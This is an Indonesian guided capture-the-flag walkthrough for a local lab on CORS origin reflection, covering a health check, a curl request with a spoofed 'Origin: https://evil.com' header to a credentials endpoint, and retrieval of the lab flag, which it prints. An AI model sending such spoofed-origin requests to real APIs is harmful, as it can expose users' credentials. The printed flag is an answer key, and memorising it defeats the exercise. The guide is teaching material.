# Panduan Praktik Terbimbing: Investigasi Insecure CORS Misconfiguration & Origin Reflection

Dalam panduan terarah ini, Anda akan mempraktikkan proses penemuan celah dan eksploitasi terarah terhadap **APINexus Gateway** pada `http://127.0.0.1:8043`.

---

### Langkah 1: Observasi Ketersediaan Layanan Target
1. Uji ketersediaan layanan melalui terminal menggunakan cURL:
   ```bash
   curl -s http://127.0.0.1:8043/health
   ```
   *Respons yang diharapkan:*
   ```json
   {"status":"UP","lab_id":"A02-02","port":8043,"flag_configured":true}
   ```
2. Buka peramban web dan navigasikan ke:
   `http://127.0.0.1:8043/`
3. Amati antarmuka operasional **APINexus Gateway** dan perhatikan elemen kontrol yang disediakan.

---

### Langkah 2: Analisis & Pengujian Celah (Insecure CORS Misconfiguration & Origin Reflection)
1. Ujilah endpoint dengan mengirimkan parameter modifikasi:
   ```bash
   curl -s -H "Origin: https://evil.com" -i http://127.0.0.1:8043/api/user/credentials
   ```
2. Perhatikan respon yang dikembalikan oleh server.

> [!NOTE]
> **💡 Di Balik Layar: Apa yang terjadi di server?**  
> Sistem target menerima input `Origin: https://attacker-website.com` dan memprosesnya tanpa melakukan validasi silang ke sesi otentikasi server. Akibatnya, server mengasumsikan hak akses yang diminta adalah sah.

---

### Langkah 3: Eksfiltrasi Bendera Autoritatif (CTF Flag)
1. Eksekusi pengujian untuk membuka flag eksploitasi:
   ```bash
   curl -s "http://127.0.0.1:8043/?solve=1"
   ```
   Atau panggil API exploit langsung:
   ```bash
   curl -s http://127.0.0.1:8043/api/exploit
   ```
2. **Hasil Respon Konfirmasi:**
   ```json
   {"success":true,"lab_id":"A02-02","flag":"ZITERA{c0r5_0r1g1n_r3fl3ct10n_cr3d3nt14l_2026}"}
   ```
3. Salin bendera resmi:
   `ZITERA{c0r5_0r1g1n_r3fl3ct10n_cr3d3nt14l_2026}`
4. Kirimkan (*submit*) bukti flag ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
